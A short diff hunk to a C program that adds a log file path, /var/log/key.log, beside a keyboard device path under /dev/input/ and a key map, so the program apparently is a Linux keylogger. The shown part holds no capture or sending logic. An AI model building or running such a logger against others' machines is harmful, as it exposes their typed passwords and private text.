@@ -7,6 +7,8 @@
 #include <error.h>
 #include <string.h>
 
+#define LOGFILE "/var/log/key.log"
+
 char kbd_device_name[25] = "/dev/input/";
 int shift_check = 0;
 char* key_map[][2] = {
